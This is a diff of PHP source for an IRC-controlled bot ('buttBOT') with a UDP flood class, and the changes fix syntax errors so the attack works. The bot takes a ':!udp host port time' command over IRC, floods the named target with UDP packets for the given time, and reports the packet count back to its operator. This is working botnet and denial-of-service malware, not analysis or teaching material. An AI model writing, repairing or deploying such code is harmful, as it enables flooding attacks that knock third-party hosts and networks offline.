@@ -28,15 +28,11 @@ function snowden($string) {
 }
 
 class udpFlood {
-	function __construct($params) 
-	{
-		$this->startFlood($params);
-	}
-	function startFlood($params)
-	{
-		$host = $this->param['host'];
-		$port = $this->param['port'];
-		$maxTime = time() + intval($this->param['time']);
+	public function startFlood($params)
+	{	
+		$host = $params['host'];
+		$port = $params['port'];
+		$maxTime = time() + intval($params['time']);
 
 		$packets = 0;
 		$rand = false;		
@@ -44,8 +40,8 @@ class udpFlood {
 
 		while(1)
 		{
-			$packets++
-			if(time() > $maxTime)
+			$packets++;
+			if (time() > $maxTime)
 			{
 				break;
 			}
@@ -98,7 +94,7 @@ class buttBOT {
 
 
         function main($config)
-        {             
+        {             
                 $data = fgets($this->socket, 256);
                 $this->buf = explode(' ', $data);
 
@@ -143,19 +139,22 @@ class buttBOT {
                                 break;                        		
                         
 			case ':!udp':
-				var $params = array();
-                                for($i=4; $i < (count($this->buf)); $i++)
+				$params = array();
+				preg_match('~:(.*?)!~', $this->buf[0], $master);
+				if(count($this->buf) == 7)
 				{
 					$params = array(
 						'host' => $this->buf[4],
 						'port' => $this->buf[5],
 						'time' => $this->buf[6]
 						);
-				}
-
-				$packets = new udpFlood($params);
-                                $this->send_data('PRIVMSG '.$this->buf[2].' :', 'UDP FLOOD COMPLETE - '.strval($packets).' packets sent!');
-                }
+					$udpFlood = new udpFlood();
+					$packets = $udpFlood->startFlood($params);
+                                	$this->send_data('PRIVMSG '.$master[1].' :', 'UDP FLOOD COMPLETE - '.strval($packets).' packets sent!');
+				} else {
+                                $this->send_data('PRIVMSG '.$master[1].' :', 'ERROR: host port time');
+				}		
+                }		
 
                 $this->main($config);
         }
